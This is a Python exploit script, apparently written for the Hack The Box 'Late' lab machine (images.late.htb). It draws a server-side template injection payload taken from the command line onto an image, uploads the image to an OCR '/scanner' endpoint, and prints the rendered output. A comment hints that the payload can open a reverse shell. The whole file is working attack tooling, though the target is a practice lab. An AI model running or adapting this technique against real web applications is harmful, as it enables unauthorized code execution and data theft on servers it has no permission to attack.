#!/usr/bin/python3

import os
import sys
import signal
import requests
from PIL import Image, ImageDraw, ImageFont

# Functions
# ======================================*

# === Control force exit (CTRL+C)
def exit_with_exit(sig, frame):
    print("Exiting...")
    exit(0)

signal.signal(signal.SIGINT, exit_with_exit)

# === Create image with malicious content.
def image_creation(payload):
    print("(+) Creating image with malicious content (SSTI).")

    #             |  mode  |  size  |  color  |
    img = Image.new('RGB', (2000, 200), color = (255, 255, 0))

    # Generate draw
    d = ImageDraw.Draw(img)

    # Font
    # - https://www.dafont.com/es/hack.font?text=__asdf
    current_path = os.path.abspath(os.getcwd())
    try:
        font_path = os.path.join(current_path + "/hack", "Hack-Regular.ttf")
        fnt = ImageFont.truetype(font_path, 20)
    except OSError as err:
        print("(-) You need to set the correct path to font (I recommend 'Hack' Font)")
        exit(1)

    # Text image
    d.text((10,10), payload, font=fnt, fill=(0, 0, 0))
         
    img.save(output_image_name)

    print(f"(+) Image saved as {output_image_name} in this folder.")

# === Upload file image to server and retrieve his content.
def send_request_to_ssti():
    print("(+) Uploading image file to server.")

    data_file = {"file": open(output_image_name, 'rb')}

    try:
        r = requests.post(url_site + '/scanner', files=data_file, timeout=4)
    except requests.exceptions.Timeout as err:
        print("(+) Reverse Shell? Something with delay? Doesn't matter, LET'S GO!")
        exit(0)

    print("(+) Image uploaded.")

    result = r.text
    symbols_to_change = {
        "&lt;": "<",
        "&gt;": ">",
        "&#39;": "'",
        "&#34;": '"',
        ",": "\r\n",
        "<p>": "",
        "</p>": ""
    }
    for key in symbols_to_change:
        result = result.replace(key, symbols_to_change[key])

    print("(+) Result of your payload:\n")
    print(result)

# Variables
# ======================================*

url_site = "http://images.late.htb"
output_image_name = "testeando.png"

# Main program
# ======================================*

if __name__ == '__main__':

    # === Validate arguments
    if len(sys.argv) == 2:
        payload = sys.argv[1]
    else:
        print(f"use: {sys.argv[0]} 'SSTI_PAYLOAD'")
        print("\nexample: \n     %s '{{config}}'" % sys.argv[0])
        exit(1)

    # === Validate connection to machine
    try:
        r = requests.get(url_site, timeout=5)
    except requests.exceptions.Timeout as err:
        print("(-) Connection failed! Validate VPN, /etc/hosts and responses...")
        exit(1)

    image_creation(payload)
    send_request_to_ssti()